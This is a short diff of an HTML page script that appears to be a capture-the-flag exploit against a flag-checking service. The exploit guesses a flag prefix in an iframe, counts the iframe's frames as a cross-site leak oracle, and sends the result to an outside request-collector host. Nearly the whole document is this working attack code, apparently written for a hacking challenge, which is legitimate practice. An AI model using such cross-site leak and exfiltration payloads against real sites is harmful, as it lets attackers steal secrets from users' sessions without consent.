@@ -12,8 +12,12 @@
     <script>
     const iframe = document.getElementById("iframe");
     iframe.src = "http://3.39.177.195:22222/flag?flag=hspace{";
-    iframe.onload = () => {
-        img.src = `https://hespyff.request.dreamhack.games/${iframe.contentWindow.frames.length}`;
+    iframe.onload = async () => {
+        const response = await fetch("http://3.39.177.195:22222/flag?flag=hspace{");
+        const text = await response.text();
+        if (text === "good try") {
+            img.src = `https://xwtwbbh.request.dreamhack.games/${iframe.contentWindow.frames.length}`;
+        }
     };
     </script>
 </body>
